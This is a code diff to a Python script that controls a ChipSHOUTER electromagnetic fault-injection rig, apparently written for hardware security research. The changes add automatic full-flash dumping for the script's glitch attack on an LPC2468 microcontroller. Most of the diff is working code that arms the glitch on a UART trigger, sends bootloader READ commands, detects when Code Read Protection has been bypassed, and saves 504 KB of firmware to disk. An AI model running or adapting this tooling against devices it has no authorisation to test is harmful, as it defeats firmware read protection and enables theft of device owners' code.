@@ -26,6 +26,7 @@ import threading
 import json
 import csv
 import os
+import re
 import argparse
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -49,6 +50,10 @@ parser.add_argument('--y-min', type=int, default=None, help='Restrict scan to Y 
 parser.add_argument('--y-max', type=int, default=None, help='Restrict scan to Y <= this (overrides --end y)')
 parser.add_argument('--trigger-byte', default='0D',
                     help='UART trigger byte in hex (default 0D = CR). E.g. --trigger-byte 39 to fire on "9" in the "19\\r" response')
+parser.add_argument('--no-dump', action='store_true',
+                    help='Skip full-flash dump on successful glitch (default: dump 504 KB and save to dump_<ts>_x<X>_y<Y>_v<V>.bin)')
+parser.add_argument('--dump-size', type=lambda v: int(v, 0), default=0x7E000,
+                    help='Bytes to dump on a successful glitch (default 0x7E000 = 504 KB, LPC2468 user flash)')
 args = parser.parse_args()
 
 # Determine direction (default is forward)
@@ -78,6 +83,11 @@ SHOTS_PER_POSITION = 15  # Number of glitch attempts per position
 TARGET_BAUD = 115200
 CRYSTAL_KHZ = 8000
 RESET_DELAY = 300
+
+# How many bytes to attempt to dump after a successful glitch (CLI-overridable
+# via --dump-size). Default is LPC2468 user-accessible flash = 504 KB; the top
+# 8 KB (0x7E000..0x7FFFF) is the reserved boot block and returns rc=14.
+FLASH_DUMP_SIZE = args.dump_size
 
 # ChipSHOUTER parameters
 CS_VOLTAGE = 500  # Starting voltage in V (ChipSHOUTER max: 500V)
@@ -763,53 +773,109 @@ def check_and_reset_chipshouter():
     """Legacy wrapper - use ensure_cs_ready instead"""
     return ensure_cs_ready()
 
-def run_glitch_test():
+_HEX_LINE_RE = re.compile(r'^0x([0-9A-F]{8}):\s+((?:[0-9A-F]{2} ){1,16})')
+
+
+def run_glitch_test(x, y, voltage):
     """
-    Run a single glitch test.
-    Returns: 'normal' (error 19), 'effect' (no reply), 'glitch' (0), or 'cs_error'
+    Single armed-read shot via the native TARGET BL READ command.
+
+    By default, every shot attempts a *full* flash dump (FLASH_DUMP_SIZE
+    bytes). The trigger fires on the LPC echoing the \\r at the end of our
+    R command (PIO trigger on Pico GP5 = LPC UART TX). If the glitch lands
+    during the LPC's CRP check, the LPC returns rc=0 and streams the entire
+    requested range; we save the dump immediately because that bypass may
+    not be reproducible on the very next attempt.
+
+    If --no-dump is set, we issue a cheap 4-byte read instead and never
+    save anything — useful for sweep/heatmap discovery scans.
+
+    Returns: 'normal'   (CRP active, rc=19)
+             'glitch'   (read succeeded — CRP bypassed; dump saved if enabled)
+             'effect'   (no/garbled reply — target perturbed but no bypass)
+             'cs_error' (ChipSHOUTER fault)
     """
-    # Check ChipSHOUTER status first
     if not check_and_reset_chipshouter():
         return 'cs_error'
 
-    # Setup UART trigger
+    # Setup trigger and arm
     send_cmd(f"TRIGGER UART {TRIGGER_BYTE_HEX}")
     send_cmd("SET PAUSE 5000")
     send_cmd("SET WIDTH 150")
     send_cmd("SET COUNT 1")
-
-    # Arm the glitch system
     send_cmd("ARM ON")
 
-    # Send the read command - triggers on \r
-    send_raw('TARGET SEND "R 0 4"')
+    # Pick read size based on mode.
+    if args.no_dump:
+        read_bytes = 4
+        idle_limit = 1.5          # cheap mode — small reply
+        deadline_after = 5
+    else:
+        read_bytes = FLASH_DUMP_SIZE
+        idle_limit = 15.0         # 30-line group at 11.5 KB/s ≈ 0.5 s; plenty
+        deadline_after = 240      # 504 KB at ~5.5 KB/s ≈ 90 s; allow slack
 
-    # Wait for response
-    response = read_until_prompt(timeout=3)
+    # Issue the read — trigger fires on the echoed \r byte
+    send_raw(f"TARGET BL READ 0 {read_bytes}")
 
-    # Parse response
-    for line in response.split('\n'):
-        line = line.strip()
-        if line.startswith("R 0 4"):
-            isp_response = line[5:].strip()
-            if isp_response == "19":
-                return 'normal'
-            elif isp_response == "0" or (isp_response.startswith("0") and len(isp_response) >= 4):
-                return 'glitch'
-            elif not isp_response:
-                return 'effect'
-            else:
-                return 'effect'  # Unexpected = probably crash
+    dump_bytes = bytearray()
+    line_buf = ""
+    saw_rc19 = False
+    saw_other_error = False
+    saw_ok_marker = False
+    last_data = time.time()
+    deadline = time.time() + deadline_after
 
-    # Check for hex format responses
-    if "31 39" in response:
+    while time.time() < deadline:
+        if s.in_waiting:
+            chunk = s.read(s.in_waiting).decode('utf-8', errors='replace')
+            line_buf += chunk
+            last_data = time.time()
+            parts = line_buf.split('\n')
+            line_buf = parts[-1]
+            for ln in parts[:-1]:
+                ln = ln.rstrip('\r')
+                m = _HEX_LINE_RE.match(ln)
+                if m:
+                    for b in m.group(2).strip().split():
+                        dump_bytes.append(int(b, 16))
+                elif "CODE_READ_PROTECTION_ENABLED" in ln or "rc=19" in ln:
+                    saw_rc19 = True
+                elif "OK: Read" in ln:
+                    saw_ok_marker = True
+                elif "ERROR" in ln:
+                    saw_other_error = True
+            if saw_ok_marker or saw_rc19:
+                break
+        elif time.time() - last_data > idle_limit:
+            break
+        else:
+            time.sleep(0.05)
+
+    # Classify
+    if saw_rc19:
         return 'normal'
-    elif "30 " in response or "30 0D" in response:
+
+    if saw_ok_marker and len(dump_bytes) > 0:
+        # A successful glitch yielded real flash data. Save it now — the
+        # bypass might not repeat on a second attempt.
+        if not args.no_dump:
+            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+            dump_path = f"dump_{ts}_x{x}_y{y}_v{voltage}.bin"
+            with open(dump_path, 'wb') as f:
+                f.write(dump_bytes)
+            print(f"\n  [GLITCH @ ({x},{y}) {voltage}V — "
+                  f"saved {len(dump_bytes)} bytes to {dump_path}]",
+                  flush=True)
+            log_test(x, y, voltage, 0, 'dump_saved',
+                     hit_rate=None, optimized_voltage=None)
         return 'glitch'
-    elif "No response" in response or not response.strip():
+
+    if saw_other_error or not dump_bytes:
         return 'effect'
 
-    return 'effect'  # Default: assume crash/effect
+    # Got some hex but no terminator — partial dump, treat as effect
+    return 'effect'
 
 def sync_target():
     """Sync with target ISP bootloader"""
@@ -849,7 +915,7 @@ def test_position(x, y, voltage, shots=SHOTS_PER_POSITION):
             completed += 1
             continue
 
-        result = run_glitch_test()
+        result = run_glitch_test(x, y, voltage)
 
         if result == 'cs_error':
             # ChipSHOUTER error - retry this shot (don't count)
@@ -870,6 +936,9 @@ def test_position(x, y, voltage, shots=SHOTS_PER_POSITION):
         if result == 'effect' or result == 'glitch':
             hits += 1
             if result == 'glitch':
+                # The dump (if any) was already saved inside run_glitch_test —
+                # the bypass shot IS the dump attempt, so a second-try dump
+                # would risk losing the only successful capture.
                 glitch_found = True
                 print("+", end='', flush=True)
             else:
